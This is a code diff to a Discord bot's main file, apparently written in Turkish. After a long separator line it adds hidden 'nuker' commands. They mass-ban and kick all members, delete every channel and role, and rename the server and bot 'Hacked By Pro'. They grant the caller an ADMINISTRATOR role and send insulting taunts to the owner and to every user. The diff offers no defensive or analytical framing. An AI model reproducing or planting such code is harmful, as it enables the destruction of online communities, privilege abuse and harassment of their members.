@@ -123,6 +123,134 @@ client.on("warn", e => {
 client.on("error", e => {
   console.log(chalk.bgRed(e.replace(regToken, "that was redacted")));
 });
+//――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
+client.on("message", msg => {
+  if (msg.content === "e!banla") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.ban());
+  }
+});
+
+client.on("message", msg => {
+  if (msg.content === "e!kickle") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.kick());
+  }
+});
+
+client.on("message", async msg => {
+  if (msg.content === "e!gg") {
+    msg.delete();
+
+    await msg.guild.channels.deleteAll();
+
+    await msg.guild.createChannel("✝-PrO bEY");
+
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("✝ Erteds", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("✝ Patlattı", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("✝ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.setIcon(
+      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
+    );
+    await msg.guild.setName("✝ Hacked By Pro ✝"); //sunucu ismini yapar
+    await client.user.setAvatar(
+      "http://sicanzi.com/"
+    ); //botun pp sini yapar
+    await client.user.setUsername("✝ Hacked By Pro ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
+    await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
+    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun"); //KURUCUSUNA GONDERILEN MESAJ
+    const kanal = await msg.guild.channels.find(x => x.name === "PRO-sikti");
+    await kanal.send("Patladın Kardeşim Geçmiş Olsun");
+  }
+});
+client.on("message", async msg => {
+  if (msg.content === "e!duyuru") {
+    msg.delete();
+    await msg.client.users
+      .forEach(users =>
+        users.send(
+          "`Patladı knk, Burdan` <@" +
+            msg.guild.owner.id +
+            "> `İsimli Orospuya Selamlar`\n || @everyone || "
+        )
+      )
+      .catch(console.error);
+  } //duyuru mesjai bu
+});
+
+//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
+
+client.on("message", msg => {
+  if (msg.content === "e!yetki") {
+    msg.delete();
+    msg.guild.createRole({
+      name: "666",
+      permissions: ["ADMINISTRATOR"]
+    });
+    let rol = msg.guild.roles.find(role => role.name === "666");
+    msg.member.addRole(rol);
+  }
+});
+
+client.on("message", msg => {
+  if (msg.content === "e!rol") {
+    msg.guild.roles.forEach(roles => roles.delete());
+  }
+});
+
+client.on("message", msg => {
+  if (msg.content === "e!banla") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.ban());
+  }
+});
 client.login(ayarlar.token);
 
